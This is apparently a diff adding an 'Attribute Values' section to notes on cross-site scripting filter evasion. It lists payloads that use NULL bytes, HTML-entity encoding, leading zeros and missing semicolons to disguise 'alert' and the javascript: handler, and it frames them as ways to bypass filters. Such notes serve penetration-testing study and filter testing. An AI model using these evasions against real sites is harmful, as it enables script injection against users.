@@ -123,4 +123,29 @@ Note that even where an attack does not require any tag attributes, you should a
 
  ```<script/anyjunk>alert(1)</script>```
  
+**Attribute Values**
+ 
+Within attribute values themselves, you can use the NULL byte trick, and you also can HTML-encode characters within the value:
+ 
+```
+<img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+```
+Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters. For example, the following attack bypasses many filters seeking to block use of the JavaScript pseudo-protocol handler:
+
+ ```<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >```
+
+ When using HTML encoding, it is worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding issues may overlook. You can use both decimal and hexa-decimal format, add superfluous leading zeros, and omit the trailing semicolon.
+
+The following examples all work on at least one browser:
+```
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+```
+ 
  References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
